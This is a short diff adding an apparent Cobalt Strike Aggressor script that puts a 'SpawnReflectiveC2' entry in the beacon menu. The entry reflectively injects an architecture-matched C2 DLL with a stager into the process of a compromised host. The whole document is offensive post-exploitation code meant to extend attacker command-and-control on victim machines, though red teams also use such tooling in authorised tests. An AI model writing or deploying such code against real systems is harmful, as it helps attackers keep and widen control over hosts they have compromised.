@@ -1,0 +1,14 @@
+popup beacon_bottom {
+    separator();
+    item "SpawnReflectiveC2" {
+        if(-is64 $1)
+        {
+            $dll = "SpawnReflectiveC2-x64.dll";
+        } else {
+            $dll = "SpawnReflectiveC2-x86.dll";
+        }
+        blog($1, "Spwan DLL :" .$dll);
+        bdllspawn!($1, script_resource($dll), $stager, $null, 2000);
+    }
+}
+#/home/rvn0xsy/Git/AggressorScripts/SpawnReflectiveC2/SpawnReflectiveC2.cna
